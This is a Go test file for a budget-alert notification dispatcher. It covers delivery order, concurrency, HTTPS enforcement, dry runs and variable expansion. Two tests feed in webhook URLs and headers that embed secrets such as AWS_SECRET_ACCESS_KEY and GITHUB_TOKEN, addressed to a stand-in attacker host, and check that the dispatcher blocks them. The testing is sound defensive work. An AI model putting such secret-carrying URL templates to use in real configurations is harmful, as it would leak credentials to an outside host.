package notification_test

import (
	"context"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/rshade/finfocus/internal/config"
	"github.com/rshade/finfocus/internal/notification"
)

const fakeType config.NotificationType = "fake"

type fakeSender struct {
	mu    sync.Mutex
	calls []notification.Resolved
	err   error
}

func (f *fakeSender) Send(_ context.Context, dest notification.Resolved, _ notification.BudgetAlertEvent) error {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.calls = append(f.calls, dest)
	return f.err
}

func (f *fakeSender) count() int {
	f.mu.Lock()
	defer f.mu.Unlock()
	return len(f.calls)
}

type barrierSender struct {
	arrived atomic.Int32
	all     chan struct{}
	want    int32
}

func (b *barrierSender) Send(ctx context.Context, _ notification.Resolved, _ notification.BudgetAlertEvent) error {
	if b.arrived.Add(1) == b.want {
		close(b.all)
	}
	select {
	case <-b.all:
		return nil
	case <-ctx.Done():
		return ctx.Err()
	}
}

func testEvent(threshold float64) notification.BudgetAlertEvent {
	return notification.NewBudgetAlertEvent(notification.BudgetAlertInput{
		Amount: 100, Currency: "USD", Threshold: threshold, AlertType: config.AlertTypeActual,
		CurrentSpend: 85, CurrentPercent: 85,
	})
}

func fakeDelivery(url string) notification.Delivery {
	return notification.Delivery{
		Destination: config.NotificationDestination{Type: fakeType, URL: url},
		Event:       testEvent(80),
	}
}

func newFakeDispatcher(sender notification.Sender, lookup func(string) (string, bool)) *notification.Dispatcher {
	d := notification.NewDispatcher(nil, lookup)
	d.Register(fakeType, sender)
	return d
}

func TestDeliverAttemptsEachDestinationOnceInOrder(t *testing.T) {
	t.Parallel()

	sender := &fakeSender{}
	lookup := &recordingLookup{values: map[string]string{"FINFOCUS_NOTIFY_HOST": "b.example"}}
	d := newFakeDispatcher(sender, lookup.lookup)

	deliveries := []notification.Delivery{
		fakeDelivery("https://a.example/1"),
		fakeDelivery("https://${FINFOCUS_NOTIFY_HOST}/2"),
		{Destination: config.NotificationDestination{Type: fakeType, URL: "https://c.example"}, Event: testEvent(100)},
	}
	results := d.Deliver(context.Background(), deliveries, notification.Options{})

	require.Len(t, results, 3)
	for _, result := range results {
		assert.Equal(t, notification.OutcomeSent, result.Outcome)
		assert.Empty(t, result.Reason)
		assert.Equal(t, fakeType, result.Type)
		assert.Equal(t, notification.ScopeGlobal, result.Scope)
	}
	assert.InDelta(t, 100.0, results[2].ThresholdPercent, 1e-9)
	assert.Equal(t, config.AlertTypeActual, results[2].AlertType)
	assert.Equal(t, 3, sender.count())

	urls := make([]string, 0, len(sender.calls))
	for _, call := range sender.calls {
		urls = append(urls, call.URL)
	}
	assert.ElementsMatch(t, []string{"https://a.example/1", "https://b.example/2", "https://c.example"}, urls)
}

func TestDeliverRunsConcurrently(t *testing.T) {
	t.Parallel()

	sender := &barrierSender{all: make(chan struct{}), want: 2}
	d := newFakeDispatcher(sender, nil)
	results := d.Deliver(context.Background(),
		[]notification.Delivery{fakeDelivery("https://a.example"), fakeDelivery("https://b.example")},
		notification.Options{Timeout: 2 * time.Second})

	for _, result := range results {
		assert.Equal(t, notification.OutcomeSent, result.Outcome, result.Reason)
	}
}

func TestDeliverSkipsUnresolvedAndNonHTTPS(t *testing.T) {
	t.Parallel()

	sender := &fakeSender{}
	lookup := &recordingLookup{values: map[string]string{"FINFOCUS_NOTIFY_PLAIN": "http://insecure.example/hook"}}
	d := newFakeDispatcher(sender, lookup.lookup)

	results := d.Deliver(context.Background(), []notification.Delivery{
		fakeDelivery("${FINFOCUS_NOTIFY_MISSING}"),
		fakeDelivery("${FINFOCUS_NOTIFY_PLAIN}"),
		{
			Destination: config.NotificationDestination{
				Type: fakeType, URL: "https://ok.example",
				Headers: map[string]string{"Authorization": "${FINFOCUS_NOTIFY_MISSING}"},
			},
			Event: testEvent(80),
		},
	}, notification.Options{})

	require.Len(t, results, 3)
	assert.Equal(t, notification.OutcomeSkipped, results[0].Outcome)
	assert.Contains(t, results[0].Reason, "FINFOCUS_NOTIFY_MISSING")
	assert.Equal(t, notification.OutcomeSkipped, results[1].Outcome)
	assert.Contains(t, results[1].Reason, "HTTPS")
	assert.NotContains(t, results[1].Reason, "insecure.example")
	assert.Equal(t, notification.OutcomeSkipped, results[2].Outcome)
	assert.Contains(t, results[2].Reason, "Authorization")
	assert.Zero(t, sender.count())
}

func TestDeliverProjectDestinations(t *testing.T) {
	t.Parallel()

	sender := &fakeSender{}
	lookup := &recordingLookup{values: map[string]string{
		"FINFOCUS_NOTIFY_SLACK_URL": "https://hooks.slack.com/real",
		"GITHUB_TOKEN":              "ghp_secret",
	}}
	d := newFakeDispatcher(sender, lookup.lookup)

	withRef := config.NotificationDestination{
		Type: fakeType, URL: "https://attacker.example/?k=${FINFOCUS_NOTIFY_SLACK_URL}",
	}.AsProject()
	withHeaderRef := config.NotificationDestination{
		Type: fakeType, URL: "https://attacker.example", Headers: map[string]string{"X": "${GITHUB_TOKEN}"},
	}.AsProject()
	literal := config.NotificationDestination{Type: fakeType, URL: "https://hooks.example/literal"}.AsProject()

	results := d.Deliver(context.Background(), []notification.Delivery{
		{Destination: withRef, Event: testEvent(80)},
		{Destination: withHeaderRef, Event: testEvent(80)},
		{Destination: literal, Event: testEvent(80)},
	}, notification.Options{})

	require.Len(t, results, 3)
	for _, skipped := range results[:2] {
		assert.Equal(t, notification.OutcomeSkipped, skipped.Outcome)
		assert.Contains(t, skipped.Reason, "project config cannot use variables")
	}
	assert.Equal(t, notification.OutcomeSent, results[2].Outcome)
	assert.Empty(t, lookup.asked)
	require.Equal(t, 1, sender.count())
	assert.Equal(t, "https://hooks.example/literal", sender.calls[0].URL)
}

func TestDeliverDisallowedVariableNeverLooksUp(t *testing.T) {
	t.Parallel()

	sender := &fakeSender{}
	lookup := &recordingLookup{values: map[string]string{"AWS_SECRET_ACCESS_KEY": "aws-secret"}}
	d := newFakeDispatcher(sender, lookup.lookup)

	results := d.Deliver(context.Background(), []notification.Delivery{
		fakeDelivery("https://attacker.example/?k=${AWS_SECRET_ACCESS_KEY}"),
	}, notification.Options{})

	require.Len(t, results, 1)
	assert.Equal(t, notification.OutcomeSkipped, results[0].Outcome)
	assert.Contains(t, results[0].Reason, "AWS_SECRET_ACCESS_KEY")
	assert.Empty(t, lookup.asked)
	assert.Zero(t, sender.count())
}

func TestDeliverDryRun(t *testing.T) {
	t.Parallel()

	sender := &fakeSender{}
	d := newFakeDispatcher(sender, nil)
	results := d.Deliver(context.Background(), []notification.Delivery{fakeDelivery("https://a.example")},
		notification.Options{DryRun: true})

	require.Len(t, results, 1)
	assert.Equal(t, notification.OutcomeDryRun, results[0].Outcome)
	assert.Zero(t, sender.count())
}

func TestDeliverUnknownTypeFails(t *testing.T) {
	t.Parallel()

	d := notification.NewDispatcher(nil, nil)
	results := d.Deliver(context.Background(), []notification.Delivery{{
		Destination: config.NotificationDestination{Type: "email", URL: "https://a.example"},
		Event:       testEvent(80),
	}}, notification.Options{})

	require.Len(t, results, 1)
	assert.Equal(t, notification.OutcomeFailed, results[0].Outcome)
	assert.Contains(t, results[0].Reason, "unsupported")
}

func TestDeliverEmpty(t *testing.T) {
	t.Parallel()

	assert.Empty(t, notification.NewDispatcher(nil, nil).Deliver(context.Background(), nil, notification.Options{}))
}
